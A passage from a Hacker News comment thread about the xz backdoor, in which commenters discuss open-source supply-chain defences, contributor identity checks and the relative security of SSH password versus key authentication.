anyone else. The project's contribution guidelines weren't a factor in its community size, and this would've happened whether it used OM or not. [1]: [http://hintjens.com/blog:106](http://hintjens.com/blog%3A106) [2]: [http://hintjens.com/blog:106/comments/show#post-2409627](http://hintjens.com/blog%3A106/comments/show#post-2409627) | | --- | --- | --- | | | |  |  | [zeven7](user?id=zeven7) [9 months ago](item?id=39881250)   | [root](#39880433) | [parent](#39880972) | [next](#39885123) [–]  > The problem with xz wasn't a small community; it was *no* community. A single malicious actor got control of the project, and there was little oversight from anyone else. So because of this a lot of other highly used software was importing and depending on unreviewed code. It's scary to think how common this is. The attack surface seems unmanageable. There need to be tighter policies around what dependencies are included, ensuring that they meet some kind of standard. | | --- | --- | --- | | | |  |  | [imiric](user?id=imiric) [9 months ago](item?id=39881407)   | [root](#39880433) | [parent](#39881250) | [next](#39881528) [–]  > There need to be tighter policies around what dependencies are included, ensuring that they meet some kind of standard. This is why it's a good practice to minimize the amount of dependencies, and add dependencies only when absolutely required. Taking this a step further, doing a cursory review of each dependency, seeing the transitive dependencies it introduces, are also beneficial. Of course, it's impractical to do this for the entire dependency tree, and at some point we have to trust that the projects we depend on follow this same methodology, but having a lax attitude about dependency management is part of the problem that caused the xz situation. One thing that I think would improve this are "maintenance scores". A service that would scan projects on GitHub and elsewhere, and assign a score to each project that indicates how well maintained it is. It would take into account the number of contributors in the past N months, development activity, community size and interaction, etc. Projects could showcase this in a badge in their READMEs, and it could be integrated in package managers and IDEs that could warn users if adding a dependency that has a low maintenance score. Hopefully this would disuade people to use poorly maintained projects, and encourage them to use better maintained ones, or avoid the dependency altogether. It would also encourage maintainers to improve their score, and there would be higher visibility of projects that are struggling, but have a high user base, as potentially more vulnerable to this type of attack. And then we can work towards figuring out how to provide the help and resources they need to improve. Does such a service/concept exist already? I think GitHub should introduce something like this, since they have all the data to power it. | | --- | --- | --- | | | |  |  | [anonymous-panda](user?id=anonymous-panda) [9 months ago](item?id=39881556)   | [root](#39880433) | [parent](#39881407) | [next](#39881454) [–]  That’s not an effective idea for the same reason that lines of code is not a good measure of productivity. It’s an easy measure to automate but it’s purely performative as it doesn’t score the qualitative value of any of the maintenance work. At best it encourages you to use only popular projects which is its own danger (software monoculture is cheaper to attack) without actually resolving the danger - this attack is reasonably sophisticated and underhanded that could be slipped through almost any code review. One real issue is that xz’s build system is so complicated that it’s possible to slip things in which is an indication that the traditional autoconf Linux build mechanism needs to be retired and banned from distros. But even that’s not enough because an attack only needs to succeed once. The advice to minimize your dependencies is an impractical one in a lot of cases (clearly) and not in your full control as you may acquire a surprising dependency due to transitiveness. And updating your dependencies is a best practice which in this case actually introduces the problem. We need to focus on real ways to improve the supply chain. eg having repeatable idempotent builds with signed chain of trusts that are backed by real identities that can be prosecuted and burned. For example, it would be pretty effective counter incentive for talent if we could permanently ban this person from ever working on lots of projects. That’s typically how humans deal with members of a community who misbehave and we don’t have a good digital equivalent for software development. Of course that’s also dangerous as blackball environments tend to become weaponized. | | --- | --- | --- | | | |  |  | [kbenson](user?id=kbenson) [9 months ago](item?id=39881936)   | [root](#39880433) | [parent](#39881556) | [next](#39881454) [–]  > We need to focus on real ways to improve the supply chain. eg having repeatable idempotent builds with signed chain of trusts that are backed by real identities that can be prosecuted and burned. So, either no open source development because nobody will vouch to that degree for others, or absolutely no anonymity and you'll have to worry about anything you provide because of you screw up and introduce a RCE all of a sudden you'll have a bunch of people and companies looking to say it was on purpose so they don't have to own up to any of their own poor practices that allowed it to actually be executed on? | | --- | --- | --- | | | |  |  | [anonymous-panda](user?id=anonymous-panda) [9 months ago](item?id=39882273)   | [root](#39880433) | [parent](#39881936) | [next](#39881454) [–]  You don’t need vouching for anyone. mDL is going to be a mechanism to have a government authority vouch your identity. Of course a state actor like this can forge the identity, but that forgery at least will give a starting point for the investigation to try to figure out who this individual is. There’s other technical questions about how you verify that the identity really is tied in some real way to the user at the other end (eg not a stolen identity) but there are things coming down that will help with that (ie authenticated chains of trust for hw that can attest the identity was signed on the given key in person and you require that attestation). As for people accusing you of an intentional RCE, that may be a hypothetical scenario but I doubt it’s very real. Most people have a very long history of good contributions and therefore have built up a reputation that would be compared against the reality on the ground. No one is accusing Lasse Collin of participating in this even though arguably it could have been him all along for what anyone knows. It doesn’t need to be perfect but directionally it probably helps more than it hurts. All that being said, this clearly seems like a state actor which changes the calculus for any attempts like this since the funding and power is completely different than what most people have access to and likely we don’t have any really good countermeasures here beyond making it harder for obfuscated code to make it into repositories. | | --- | --- | --- | | | |  |  | [braiamp](user?id=braiamp) [9 months ago](item?id=39881454)   | [root](#39880433) | [parent](#39881407) | [prev](#39881556) | [next](#39881528) [–]  Your idea sounds nice in theory, but it's absolutely not worth the amount of effort. To put it in perspective, think about xz case, and how the amount of contributions would have prevented the release artifact (tar file) from being modified? Because other people would have used the tar file? Why? The only ones that use tarfiles are the ones that would be redistributing the code, they will not audit it. The ones that could audit it would look at the version system repository, not at the tar files. In other words, your solution wouldn't even be effective at potentially discovering this issue. The only thing that would effectively do this, is that people stop trusting build artifacts and instead use direct from public repositories packaging. You could figure out if someone maliciously modified the release artifact by comparing it against the tagged version, but at that point, why not just shallow clone the entire thing and be done. | | --- | --- | --- | | | |  |  | [cjbprime](user?id=cjbprime) [9 months ago](item?id=39881528)   | [root](#39880433) | [parent](#39881250) | [prev](#39881407) | [next](#39881281) [–]  Even if you mandated two code reviewers per merge, the attacker can just have three fake personas backed by the same single human and use them to author and approve malware. | | --- | --- | --- | | | |  |  | [Deathcrow](user?id=Deathcrow) [9 months ago](item?id=39881822)   | [root](#39880433) | [parent](#39881528) | [next](#39881281) [–]  Also, in a more optimistic scenario without sockpuppets, it's unlikely that malicious and underhanded contributions will be caught by anyone that isn't a security researcher. | | --- | --- | --- | | | |  |  | [colejohnson66](user?id=colejohnson66) [9 months ago](item?id=39881281)   | [root](#39880433) | [parent](#39881250) | [prev](#39881528) | [next](#39881318) [–]  As always, there's a relevant XKCD: #2347.[0] It's frightening how much of modern infrastructure depends on vulnerable systems. [0]: <https://xkcd.com/2347/> | | --- | --- | --- | | | |  |  | [eacapeisfutuile](user?id=eacapeisfutuile) [9 months ago](item?id=39881318)   | [root](#39880433) | [parent](#39881250) | [prev](#39881281) | [next](#39885123) [–]  Does that mean we don’t look into changes in dependencies at all when bumping them? | | --- | --- | --- | | | |  |  | [chii](user?id=chii) [9 months ago](item?id=39885123)   | [root](#39880433) | [parent](#39880972) | [prev](#39881250) | [next](#39882175) [–]  > then strange behavior and commits that claim to do one thing but actually do something else, are more likely to be spotted earlier than later. <https://en.wikipedia.org/wiki/Underhanded_C_Contest> It's actually an art to writing code like that, but it's not impossible and will dodge cursory inspection. And it's possible to have plausible deniability in the way it is constructed. | | --- | --- | --- | | | |  |  | [imiric](user?id=imiric) [9 months ago](item?id=39885749)   | [root](#39880433) | [parent](#39885123) | [next](#39882175) [–]  I'm not sure why my point is not getting across... I'm not saying that these manual and automated checks make a project impervious to malicious actors. Successful attacks are always a possibility even in the strictest of environments. What they do provide is a \_chance reduction\_ of these attacks being successful. Just like following all the best security practices doesn't produce 100% secure software, neither does following best development practices prevent malicious code from being merged in. But this doesn't mean that it's OK to ignore these practices altogether, as they do have tangible benefits. I argue that projects that have them are better prepared against this type of attack than those that do not. | | --- | --- | --- | | | |  |  | [yosito](user?id=yosito) [9 months ago](item?id=39882175)   | [root](#39880433) | [parent](#39880972) | [prev](#39885123) | [next](#39881348) [–]  I wonder how good automated LLM-based code reviews would be at picking up suspicious patterns in pull requests. | | --- | --- | --- | | | |  |  | [benreesman](user?id=benreesman) [9 months ago](item?id=39881348)   | [parent](#39880433) | [prev](#39880972) | [next](#39885453) [–]  It never ceases to amaze me how great of lengths companies go to round securing the perimeter of the network but then have engineering staffs that just routinely brew install casks or vi/emacs/vscode/etc extensions. Rust is arguably the programming language and/or community with the most secure set of defaults that are fairly impossible to get out of, but even at “you can’t play games with pointers” levels of security-first, the most common/endorsed path for installing *it* (that I do all the time because I’m a complete hypocrite) is: <https://www.rust-lang.org/tools/install> and that’s just one example, “yo dawg curl this shit and pipe it to sh so you can RCE while you bike shed someone’s unsafe block” is just muscle memory for way too many of us at this point. | | --- | --- | --- | | | |  |  | [sensanaty](user?id=sensanaty) [9 months ago](item?id=39882881)   | [root](#39880433) | [parent](#39881348) | [next](#39881565) [–]  I actually avoided installing Rust originally because I thought that install page was hijacked by an attacker or something. Most languages don't have the prettiest install flows, but a random `curl | sh` is just lunacy if you're *at all* security conscious | | --- | --- | --- | | | |  |  | [anonymous-panda](user?id=anonymous-panda) [9 months ago](item?id=39881565)   | [root](#39880433) | [parent](#39881348) | [prev](#39882881) | [next](#39881419) [–]  It’s worse than that. Build.rs is in no way sandboxed which means you can inject all sorts of badness into downstream dependencies not to mention do things like steal crypto keys from developers. It’s really a sore spot for the Rust community (to be fair they’re not uniquely worse but that’s a fact poor standard to shoot for). | | --- | --- | --- | | | |  |  | [godelski](user?id=godelski) [9 months ago](item?id=39881419)   | [root](#39880433) | [parent](#39881348) | [prev](#39881565) | [next](#39885453) [–]  > yo dawg curl this shit and pipe it to sh so you can RCE while you bike shed someone’s unsafe block Ahhh this takes me back to... a month ago...[0] At least rust wraps function in main so you won't run a partial command, but still doesn't there aren't other dangers. I'm more surprised by how adamant people are about that there's no problem. You can see elsewhere in the thread that piping man still could (who knows!) pose a risk. Extra especially when you consider how trivial the fix is, especially when people are just copy pasting the command anyways... It never ceases to amaze me how resistant people are to very easily solvable problems. [0] <https://news.ycombinator.com/item?id=39556047> | | --- | --- | --- | | | |  |  | [SeriousM](user?id=SeriousM) [9 months ago](item?id=39885453)   | [parent](#39880433) | [prev](#39881348) | [next](#39881974) [–]  To be honest, it just was a matter of time till we find out our good faith beliefs are exploited. Behaviors like "break fast and fix eary" or "who wants to take my peojeklct ownership" just ask for trouble and yet it's unthinkable to live without them because open source is an unpaid labor of love to code. Sad to see such happening but I'm not surprised. I wish to get better tools (also open source) to combat such bad actors. Thanks to all the researchers out there who tries to protect us all. | | --- | --- | --- | | | |  |  | [kubb](user?id=kubb) [9 months ago](item?id=39881974)   | [parent](#39880433) | [prev](#39885453) | [next](#39880985) [–]  What’s the game? | | --- | --- | --- | | | |  |  | [fredamaral](user?id=fredamaral) [9 months ago](item?id=39880985)   | [parent](#39880433) | [prev](#39881974) | [next](#39878762) [–]  dont you think that something as simple as a CLA (contributor legal agreement) would prevent this type of thing? of course creates noise in the open source contribution funnel, but let's be honest: if you are dedicating yourself to something like contributing to oss, signing a CLA should not be something unrealistic. | | --- | --- | --- | | | |  |  | [omeid2](user?id=omeid2) [9 months ago](item?id=39881004)   | [root](#39880433) | [parent](#39880985) | [next](#39881063) [–]  CLA is not an ID check. It is to handover the rights for the code over to the project owners rather than doing any identity check. | | --- | --- | --- | | | |  |  | [fredamaral](user?id=fredamaral) [9 months ago](item?id=39881052)   | [root](#39880433) | [parent](#39881004) | [next](#39881063) [–]  agreed. but it does not mean i couldn't be. as per the terms, the content of a CLA could be anything. and that's my point | | --- | --- | --- | | | |  |  | [omeid2](user?id=omeid2) [9 months ago](item?id=39882135)   | [root](#39880433) | [parent](#39881052) | [next](#39881078) [–]  Then the question becomes "should we require ID for open source contributions?" and the answer is most likely no, not a good idea. | | --- | --- | --- | | | |  |  | [creatonez](user?id=creatonez) [9 months ago](item?id=39881078)   | [root](#39880433) | [parent](#39881052) | [prev](#39882135) | [next](#39881063) [–]  That's stretching the traditional definition. Usually CLAs are solely focused on addressing the copyright conditions and intellectual property origin of the contributed changes. Maybe just "contributor agreement" or "contributor contract" would describe that. | | --- | --- | --- | | | |  |  | [tw04](user?id=tw04) [9 months ago](item?id=39881063)   | [root](#39880433) | [parent](#39880985) | [prev](#39881004) | [next](#39878762) [–]  What exactly is a CLA going to do to a CCP operative (as appears to be the case with xz)? Do you think the party is going to extradite one of their state sponsored hacking groups because they got caught trying to implement a backdoor? Or do you think they don’t have the resources to fake an identity? | | --- | --- | --- | | | |  |  | [Muromec](user?id=Muromec) [9 months ago](item?id=39881431)   | [root](#39880433) | [parent](#39881063) | [next](#39881076) [–]  The whole Chinese name and UTC+8 were a cover, as the person apparently was from EET | | --- | --- | --- | | | |  |  | [tw04](user?id=tw04) [9 months ago](item?id=39882114)   | [root](#39880433) | [parent](#39881431) | [next](#39881076) [–]  While it ultimately doesn’t matter if it was Russia or China beyond potential political fallout. Do you have a link to the proof pointing towards EET? | | --- | --- | --- | | | |  |  | [Muromec](user?id=Muromec) [9 months ago](item?id=39882875)   | [root](#39880433) | [parent](#39882114) | [next](#39881076) [–]  There was a link in this thread pointing to commit times analysis and it kinda checks out. Adding some cultural and outside world context, I can guess which alphabet this three-four-six-letter agency uses to spell it's name at least. | | --- | --- | --- | | | |  |  | [fredamaral](user?id=fredamaral) [9 months ago](item?id=39881076)   | [root](#39880433) | [parent](#39881063) | [prev](#39881431) | [next](#39878762) [–]  case closed. you are right... could of course make the things a bit more difficult for someone not backed by a state sponsor. but if that's the case, you are right. | | --- | --- | --- | | | |  |  | [tw04](user?id=tw04) [9 months ago](item?id=39881101)   | [root](#39880433) | [parent](#39881076) | [next](#39878762) [–]  Sadly the only way to even have a chance of fighting this is to insist on new contributors being vetted in person, and even that won’t be fool-proof. It’s also not scalable and likely won’t ever happen, but it’s the only solution I can come up with. | | --- | --- | --- | | | |  |  | [sneak](user?id=sneak) [9 months ago](item?id=39878762)   | [prev](#39880433) | [next](#39877698) [–]  The questions this backdoor raises: - what other ones exist by this same team or similar teams? - how many such teams are operating? - how many such dependencies are vulnerable to such infiltration attacks? what is our industry’s attack surface for such covert operations? I think making a graph of all major network services (apache httpd, postgres, mysql, nginx, openssh, dropbear ssh, haproxy, varnish, caddy, squid, postfix, etc) and all of their dependencies and all of the committers to all of those dependencies might be the first step in seeing which parts are the most high value and have attracted the least scrutiny. This can’t be the first time someone attempted this - this is just the first unsuccessful time. (Yes, I know about the attempted/discovered backdoor in the linux kernel - this is remote and is a horse of a different color). | | --- | --- | --- | | | |  |  | [almostnormal](user?id=almostnormal) [9 months ago](item?id=39879098)   | [parent](#39878762) | [next](#39881085) [–]  Why did they decide to create a backdoor, instead of using a zeroday like everyone else? Why did they implement a fully-featured backdoor and attempted to hide the way it is deployed, instead of deploying something innocent-looking that might as well be a bug if detected? These must have been conscious decisions. The reasons might provide a hint what the goals might have been. | | --- | --- | --- | | | |  |  | [bdd8f1df777b](user?id=bdd8f1df777b) [9 months ago](item?id=39879524)   | [root](#39878762) | [parent](#39879098) | [next](#39879311) [–]  Presumably because other people can also utilize the “bug” they create intentionally but looking inadvertently. This backdoor however is activated by the private key only the attacker has so it’s airtight. | | --- | --- | --- | | | |  |  | [Ekaros](user?id=Ekaros) [9 months ago](item?id=39879311)   | [root](#39878762) | [parent](#39879098) | [prev](#39879524) | [next](#39879293) [–]  If they seemingly almost succeeded how many others have already done similar backdoor? Or was this actually just poking on things seeing if it was possible to inject this sort of behaviour? | | --- | --- | --- | | | |  |  | [formerly\_proven](user?id=formerly_proven) [9 months ago](item?id=39879293)   | [root](#39878762) | [parent](#39879098) | [prev](#39879311) | [next](#39879570) [–]  Ed448 is orders of magnitude better NOBUS than hoping that nobody else stumbles over the zero-day you found. | | --- | --- | --- | | | |  |  | [im3w1l](user?id=im3w1l) [9 months ago](item?id=39879570)   | [root](#39878762) | [parent](#39879098) | [prev](#39879293) | [next](#39881085) [–]  Wild guess, but it could be that whoever was behind this was highly motivated but didn't have the skill required to find zerodays and didn't have the connections required to buy them (and distrusted the come one come all marketplaces I assume must exist). | | --- | --- | --- | | | |  |  | [mdavidn](user?id=mdavidn) [9 months ago](item?id=39881085)   | [parent](#39878762) | [prev](#39879098) | [next](#39877698) [–]  Also: Why did Debian patch a service that runs as root and accepts connections from the internet to load unnecessary libraries? | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39944448)   | [root](#39878762) | [parent](#39881085) | [next](#39877698) [–]  Also: Why did Debian apply patches to a service that runs as root (when those patches have been rected upstream) for a *second* time after such behavior has already led to a widely known vulnerability in Debian. | | --- | --- | --- | | | |  |  | [jtchang](user?id=jtchang) [9 months ago](item?id=39877698)   | [prev](#39878762) | [next](#39877790) [–]  So this basically means to scan for this exploit remotely we'd need the private key of the attacker which we don't have. Only other option is to run detection scripts locally. Yikes. | | --- | --- | --- | | | |  |  | [tialaramex](user?id=tialaramex) [9 months ago](item?id=39877824)   | [parent](#39877698) | [next](#39877997) [–]  One completely awful thing some scanners might choose to do is if you're offering RSA auth (which most SSH servers are and indeed the SecSH RFC says this is Mandatory To Implement) then you're "potentially vulnerable" which would encourage people to do password auth instead. Unless we find that this problem has somehow infested a *lot* of real world systems that seems to me even worse than the time similar "experts" decided that it was best to demand people rotate their passwords every year or so thereby ensuring the real security is reduced while on paper you claim you improved it. | | --- | --- | --- | | | |  |  | [danparsonson](user?id=danparsonson) [9 months ago](item?id=39879623)   | [root](#39877698) | [parent](#39877824) | [next](#39877997) [–]  Have to admit I've never understood why password auth is considered so much worse than using a cert - surely a decent password (long, random, etc) is for all practical purposes unguessable, and so you're either using a private RSA key that no-one can guess, or a password that no-one can guess, and then what's the difference? With the added inconvenience of having to pass around a certificate if you want to login to the same account from from multiple sources. | | --- | --- | --- | | | |  |  | [teraflop](user?id=teraflop) [9 months ago](item?id=39879800)   | [root](#39877698) | [parent](#39879623) | [next](#39879933) [–]  One of the biggest differences is that if you're using password auth, and you are tricked into connecting to a malicious server, that server now has your *plaintext* password and can impersonate you to other servers. If you use a *different* strong random password for every single server, this attack isn't a problem, but that adds a lot of management hassle compared to using a single private key. (It's also made more difficult by host key checking, but let's be honest, most of us don't diligently check the fingerprints every single time we get a mismatch warning.) In contrast, if you use an SSH key, then a compromised server never actually gets a copy of your private key unless you explicitly copy it over. (If you're have SSH agent forwarding turned on, then *during* the compromised connection, the server can run a "confused deputy" attack to authenticate other connections using your agent's identity. But it loses that ability when you disconnect.) | | --- | --- | --- | | | |  |  | [droopyEyelids](user?id=droopyEyelids) [9 months ago](item?id=39882098)   | [root](#39877698) | [parent](#39879800) | [next](#39881620) [–]  Not a rhetorical question: couldn't the malicious server relay the challenge from a valid server for to you to sign, and impersonate you that way? | | --- | --- | --- | | | |  |  | [djao](user?id=djao) [9 months ago](item?id=39885329)   | [root](#39877698) | [parent](#39882098) | [next](#39882198) [–]  If a man in the middle relays a public key challenge, that will indeed result in a valid connection, but the connection will be encrypted such that only the endpoints (or those who possess a private key belonging to one of the endpoints) can read the resulting traffic. So the man in the middle is simply relaying an encrypted conversation and has no visibility into the decrypted contents. The man in the middle can still perform denial of service, by dropping some or all of the traffic. The man in the middle could substitute their own public key in place of one of the endpoint's public keys, but if each endpoint knows the other endpoint's key and is expecting that other key, then an unexpected substitute key will raise a red flag. | | --- | --- | --- | | | |  |  | [kortilla](user?id=kortilla) [9 months ago](item?id=39882198)   | [root](#39877698) | [parent](#39882098) | [prev](#39885329) | [next](#39881620) [–]  No, these schemes use the pub/private keys to setup symmetric crypto, so just passing it along does you no good because what follows is a bunch of stuff encrypted by a session key only the endpoints know. If I am a server and have your public key in an authorized\_keys file, I can just encrypt a random session key using that and only you will be able to decrypt it to finish setting up the session. This is why passwords and asymmetric crypto are worlds apart in security guarantees. | | --- | --- | --- | | | |  |  | [someplaceguy](user?id=someplaceguy) [9 months ago](item?id=39881620)   | [root](#39877698) | [parent](#39879800) | [prev](#39882098) | [next](#39879933) [–]  > if you're using password auth, and you are tricked into connecting to a malicious server, that server now has your plaintext password and can impersonate you to other servers. Why would the password be sent in plaintext instead of, say, sending a hash of the password calculated with a salt that is unique per SSH server? Or something even more cryptographically sound. In fact, passwords in /etc/shadow already do have random salts, so why aren't these sent over to the SSH client so it can send a proper hash instead of the plaintext password? | | --- | --- | --- | | | |  |  | [danparsonson](user?id=danparsonson) [9 months ago](item?id=39881836)   | [root](#39877698) | [parent](#39881620) | [next](#39885382) [–]  If the hash permits a login then having a hash is essentially equivalent to having a password. The malicious user wouldn't be able to use it to sudo but they could deploy some other privilege escalation once logged in. | | --- | --- | --- | | | |  |  | [djao](user?id=djao) [9 months ago](item?id=39885382)   | [root](#39877698) | [parent](#39881620) | [prev](#39881836) | [next](#39879933) [–]  It's a little bit more complicated than just sending a hash of the password, but there are ways to authenticate using hashed passwords without sending the password over the wire, for example <https://en.wikipedia.org/wiki/Digest_access_authentication> or [https://en.wikipedia.org/wiki/Password-authenticated\_key\_agr...](https://en.wikipedia.org/wiki/Password-authenticated_key_agreement) Even so, these protocols require the server to know your actual password, not just a hash of the password, even though the password itself never traverses the network. So a compromised server can still lead to a compromised credential, and unless you use different passwords for every server, we're back to the same problem. | | --- | --- | --- | | | |  |  | [tialaramex](user?id=tialaramex) [9 months ago](item?id=39896778)   | [root](#39877698) | [parent](#39885382) | [next](#39879933) [–]  Asymmetric PAKEs don't require the server to know your password. You and the server need to have a discussion to establish some parameters that work for your chosen password, without revealing what it is, and then in future you can supply evidence that you indeed know the password (that is, some value which satisfies the agreed parameters), still without revealing what it is. This is not easy to do correctly, whereas it's really easy to get it wrong... <https://datatracker.ietf.org/doc/draft-irtf-cfrg-opaque/> | | --- | --- | --- | | | |  |  | [duskwuff](user?id=duskwuff) [9 months ago](item?id=39879933)   | [root](#39877698) | [parent](#39879623) | [prev](#39879800) | [next](#39882309) [–]  > Have to admit I've never understood why password auth is considered so much worse than using a cert Password auth involves sending your credentials to the server. They're encrypted, but not irreversibly; the server *needs* your plaintext username and password to validate them, and it can, in principle, record them to be reused elsewhere. Public key and certificate-based authentication only pass your username and a signature to the server. Even if you don't trust the server you're logging into, it can't do anything to compromise other servers that key has access to. | | --- | --- | --- | | | |  |  | [bostik](user?id=bostik) [9 months ago](item?id=39882309)   | [root](#39877698) | [parent](#39879623) | [prev](#39879933) | [next](#39879864) [–]  > *surely a decent password (long, random, etc) is for all practical purposes unguessable* Sadly that is not how normies use passwords. *WE* know what passwords managers are for. Vast majority of people outside our confined sphere do not. In short: password rotation policies make passwords overall less secure, because in order to remember what the new password is, people apply patterns. Patterns are guessable. Patterns get applied to *future password as well*. This has been known to the infosec people since 1990's because they had to understand how people actually behave. It took a research paper[0], *published in 2010*, to finally provide sufficient data for that fact to become undeniable. It still took another 6-7 years until the information percolated through to the relevant regulatory bodies and for them to update their previous guidance. These days both NIST and NCSC tell in very clear terms to *not* require password rotation. 0: [https://www.researchgate.net/publication/221517955\_The\_true\_...](https://www.researchgate.net/publication/221517955_The_true_cost_of_unusable_password_policies) | | --- | --- | --- | | | |  |  | [dboreham](user?id=dboreham) [9 months ago](item?id=39879864)   | [root](#39877698) | [parent](#39879623) | [prev](#39882309) | [next](#39880204) [–]  It depends what happens to the password. Typically it's sent as a bearer credential. But there are auth schemes (not widely used these days) where the password isn't sent over the wire. | | --- | --- | --- | | | |  |  | [djao](user?id=djao) [9 months ago](item?id=39885431)   | [root](#39877698) | [parent](#39879864) | [next](#39879947) [–]  Even if you use a scheme where the password never traverses the wire, the schemes still require the server to know what your password is in order to perform the authentication. So a compromised server still leads to compromise of your secret credential. Public key authentication does not have this property. | | --- | --- | --- | | | |  |  | [solardev](user?id=solardev) [9 months ago](item?id=39879947)   | [root](#39877698) | [parent](#39879864) | [prev](#39885431) | [next](#39880204) [–]  Isn't it pretty standard practice to salt and hash the password client-side before sending it over the wire? | | --- | --- | --- | | | |  |  | [cayde](user?id=cayde) [9 months ago](item?id=39880721)   | [root](#39877698) | [parent](#39879947) | [next](#39904738) [–]  No, usually it's sent in plain text to the server, however encapsulated. | | --- | --- | --- | | | |  |  | [solardev](user?id=solardev) [9 months ago](item?id=39881314)   | [root](#39877698) | [parent](#39880721) | [next](#39904738) [–]  Wow, really? Ten years ago, it was drilled into me to never send a password like that, especially since the server shouldn't have the plain version anyway (so no reason for the client to send it). [https://owasp.org/www-community/OWASP\_Application\_Security\_F...](https://owasp.org/www-community/OWASP_Application_Security_FAQ) says "Salted hash for transmitting passwords is a good technique. This ensures that the password can not be stolen even if the SSL key is broken." I didn't want to believe you, but man, I just checked a few websites in the network inspector... and it seems like GMail, Hackernews, Wordpress, Wix, and Live.com all just sent it in plaintext with only SSL encryption :( That's a bit disappointing. But TIL. Thanks for letting me know! | | --- | --- | --- | | | |  |  | [cayde](user?id=cayde) [9 months ago](item?id=39881396)   | [root](#39877698) | [parent](#39881314) | [next](#39881897) [–]  If you want to hop into a rabbit hole, try taking look in Steam's login send the user and pass)) If TLS break then all is untrusted anyway! If you read hash as MITM you can replay it as pass equivalent and log in with hash, do not need knowledge of the original pass. You can just inject the script to exfilatrate original pass before hashing. CSP is broken, since you can edit header to give your own script a inline nonce. I think everything is reliant on TLS in end. I think 10yr ago before TLS was 99%+ standard on all sites many people would come up with schemes, forums would md5 pass client side and send md5, all sorts were common. But now trust is in TLS. | | --- | --- | --- | | | |  |  | [hwaccel](user?id=hwaccel) [9 months ago](item?id=39881897)   | [root](#39877698) | [parent](#39881314) | [prev](#39881396) | [next](#39896479) [–]  > Salted hash for transmitting passwords is a good technique. This ensures that the password can not be stolen even if the SSL key is broken I'm a little confused with this recommendation How server is supposed to verify user's password in this case? Store the same hash with exactly the same salt in the database, effectively making the transmitted salted hash a cleartext password? | | --- | --- | --- | | | |  |  | [solardev](user?id=solardev) [9 months ago](item?id=39883977)   | [root](#39877698) | [parent](#39881897) | [next](#39896479) [–]  Yes, the server should never have the cleartext password. In this case the salted hash is the same as a password *to you*, but it protects users who reuse the same password across different sites. If your entire password DB gets leaked, the attacker would be able to login to your site as your users, but they wouldn't be able to login as those users to *other* sites without brute forcing all the hashes. Edit: I guess the reverse is also true, that is, leaked user passwords from other sources can't be easily tested against your user accounts just by sending a bunch of HTTP requests to your server. The attacker would have to at least run the passwords through your particular salted hash scheme first (which they can get by reverse engineering your client, but it's extra labor and computation). | | --- | --- | --- | | | |  |  | [ahmedtd](user?id=ahmedtd) [9 months ago](item?id=39896479)   | [root](#39877698) | [parent](#39881314) | [prev](#39881897) | [next](#39882216) [–]  That page seems to be a community wiki, and I think the original authors are somewhat confused on that point. If you salt and hash the password on the client side, how is the server going to verify the password. Everything I can think of either requires the server to store the plaintext password (bad) or basically makes the hashed bytes become the plaintext password (pointless). There *are* password-based solutions that work like this --- PAKEs like Secure Remote Passwords: <https://www.ietf.org/rfc/rfc2945.txt> They have low uptake because they don't really offer any security beyond just sending the plaintext password over a properly-functioning TLS channel. | | --- | --- | --- | | | |  |  | [solardev](user?id=solardev) [9 months ago](item?id=39897435)   | [root](#39877698) | [parent](#39896479) | [next](#39882216) [–]  Good catch on the wiki authors. But I think the point of salting + hashing the password isn't quite the same as what TLS offers. It's not necessarily to prevent MITM eavesdropping, but to help protect the user from credential re-use from leaks. What was I taught is that your server should never have the user's cleartext password to begin with, only the salted hash. As soon as they set it, the server only ever gets (and saves) the salted hash. That way, in the worst case scenario (data leak or rogue employee), at most your users would only have their accounts *with you* compromised. The salted hashes are useless anywhere else (barring quantum decryption). To *you* they're password equivalents, but they turn the user's weak reused password (that they may be using for banking, taxes, etc.) into a strong salted hash that's useless anywhere else. That's the benefit of doing it serverside, at least. Doing it clientside, too, means that the password itself is also never sent over the wire, just the salted hash (which is all the server needs, anyway), limiting the collateral damage if it IS intercepted in transit. But with widespread HTTPS, that's probably not a huge concern. I do think it can help prevent accidental leaks, like if your auth endpoint was accidentally misconfigured and caching or logging requests with cleartext passwords... again, just to protect the user from leaks. | | --- | --- | --- | | | |  |  | [kortilla](user?id=kortilla) [9 months ago](item?id=39882216)   | [root](#39877698) | [parent](#39881314) | [prev](#39896479) | [next](#39881537) [–]  It doesn’t actually do anything because if SSL is compromised then all of the junk you think you are telling the client to do to the password is via JavaScript that is also compromised. If you’re worried about passive listeners with ssl private keys, perfect forward secrecy at the crypto layer solved that a long time ago. For browsers at least, sending passwords plainly over a tls session is as good as it gets. | | --- | --- | --- | | | |  |  | [solardev](user?id=solardev) [9 months ago](item?id=39883988)   | [root](#39877698) | [parent](#39882216) | [next](#39881537) [–]  It's not to protect against MITM but against credential reuse. It offers no additional security over SSL but what it does protect against is user passwords being leaked and attackers being able to reuse that same password across the user's other online accounts (banks, etc.). | | --- | --- | --- | | | |  |  | [jbverschoor](user?id=jbverschoor) [9 months ago](item?id=39881537)   | [root](#39877698) | [parent](#39881314) | [prev](#39882216) | [next](#39904738) [–]  That's exactly the case with HTTP credentials and most authentication frameworks... | | --- | --- | --- | | | |  |  | [zygentoma](user?id=zygentoma) [9 months ago](item?id=39904738)   | [root](#39877698) | [parent](#39879947) | [prev](#39880721) | [next](#39880204) [–]  No. Everything you do on the client side you can also keep not doing at all. You can imagine the salted and hashed password in your scheme to be "the password". Because the server will still know it, and could use it to log in somewhere else (it just has to skip the salt-and-hash step). | | --- | --- | --- | | | |  |  | [imrehg](user?id=imrehg) [9 months ago](item?id=39880204)   | [root](#39877698) | [parent](#39879623) | [prev](#39879864) | [next](#39882008) [–]  On that last point, I wouldn't pass around the certificate to log in from multiple sources, rather each source would have its own certificate. That is easy & cheap to do (especially with ed25519 certs). | | --- | --- | --- | | | |  |  | [danparsonson](user?id=danparsonson) [9 months ago](item?id=39881851)   | [root](#39877698) | [parent](#39880204) | [next](#39882008) [–]  Ah right, that's useful, thanks. Presumably if you need to login from an untrusted source (e.g. in an emergency), then you're out of luck in that case? Do you maybe keep an emergency access cert stashed somewhere? | | --- | --- | --- | | | |  |  | [imrehg](user?id=imrehg) [9 months ago](item?id=39912915)   | [root](#39877698) | [parent](#39881851) | [next](#39882008) [–]  That's a very good question. Likely depends on the circumstances. I don't quite know any ways of using untrusted sources safely. Maybe something where you can use temporary credentials (say 2FA), or the the likes of using AWS's EC2 Instance Connect, but there's always a problem of \_something\_ has to be on an untrusted location, I guess? Having some emergency access 